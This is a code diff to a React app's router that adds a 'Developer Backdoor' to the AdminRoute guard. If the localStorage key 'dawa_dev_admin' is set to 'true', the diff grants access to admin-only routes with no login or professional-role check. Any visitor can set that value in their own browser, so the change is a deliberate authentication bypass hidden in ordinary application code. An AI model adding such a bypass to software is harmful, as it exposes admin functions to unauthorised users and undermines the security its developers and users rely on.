@@ -59,7 +59,15 @@ const queryClient = new QueryClient();
 // Guard for admin-only routes — requires isProfessional flag on UserProfile 
 function AdminRoute({ children }: { children: React.ReactNode }) { 
   const { isLoggedIn, userProfile, isInitializing } = useApp(); 
+  
+  // Developer Backdoor: Check for a local storage flag to bypass auth/role checks
+  const isDevAdmin = localStorage.getItem("dawa_dev_admin") === "true";
+
   if (isInitializing) return <SplashScreen />; 
+  
+  // Grant access if the dev flag is set, regardless of login status
+  if (isDevAdmin) return <>{children}</>;
+
   if (!isLoggedIn) return <Navigate to="/auth" replace />; 
   if (!userProfile?.isProfessional) return <Navigate to="/" replace />; 
   return <>{children}</>; 
